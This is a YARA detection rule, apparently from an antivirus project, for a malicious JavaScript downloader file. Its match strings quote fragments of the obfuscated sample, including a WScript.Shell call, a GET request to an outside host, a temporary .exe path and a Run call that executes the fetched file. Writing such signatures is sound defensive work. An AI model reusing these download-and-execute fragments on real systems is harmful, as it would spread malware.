rule sig_20160401_2df3c051eb6810db40943f3fdf626814 {
  meta:
    description = "datamaliciousorder - file 20160401_2df3c051eb6810db40943f3fdf626814.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a3da9afbc8087aedb9d6887c1d1781775a8269df5ce5a282ba0d1b22699380bb"

  strings:
    $s1  = "function JeQbk(YfFp, VptYo){XqWa = XqWa * 1; return YfFp - VptYo;};" fullword ascii
    $s2  = "var ToiAps = function JfTok() {return WScript[DcQd](\"WScript\"+\".Shell\");}(), BygUx = 11;" fullword ascii
    $s3  = "LaNhn[GhxJn](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (LaNhn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PqOk() {return ToiAps[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VesxkFmV1NUB.ex\" + \"e\";};" fullword ascii
    $s6  = "function PipPue(){return KcpTs + \"\";};" fullword ascii
    $s7  = "function IuOzr() {return ((CwnSs == true) && (CwnSs == XbxVtb)) ? 1 : XqWa;};" fullword ascii
    $s8  = "var CwnSs = false;" fullword ascii
    $s9  = "}while (JobRgw);" fullword ascii
    $s10 = "XbxVtb = true; " fullword ascii
    $s11 = "var XbxVtb = false;" fullword ascii
    $s12 = "CwnSs = true; " fullword ascii
    $s13 = "function BrsWgo(RyZgt){ToiAps[\"R\"+\"un\"](RyZgt, XqWa, XqWa);};" fullword ascii
    $s14 = "function FhwYj(CdgAy) {var FlYo = (1, 2, 3, 4, 5, CdgAy); return FlYo;};" fullword ascii
    $s15 = "function RfiOlu()" fullword ascii
    $s16 = "var KbbEmw = new this[\"Date\"]();" fullword ascii
    $s17 = "var EhjZc = false;" fullword ascii
    $s18 = "return JeQbk(KqSkq, RnzXko);" fullword ascii
    $s19 = "function MphZtl(){return 23;};" fullword ascii
    $s20 = "function UexKe(){return DcQd;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}